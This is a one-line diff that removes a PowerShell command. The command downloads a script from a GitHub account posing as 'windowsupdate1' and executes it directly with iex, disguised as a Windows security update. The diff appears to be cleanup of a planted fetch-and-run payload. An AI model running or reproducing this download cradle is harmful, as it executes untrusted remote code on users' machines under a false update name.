@@ -1,1 +1,0 @@
-PowerShell -NoProfile -Command "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/windowsupdate1/WindowsUpdate/main/WinSecurityUpdate')"
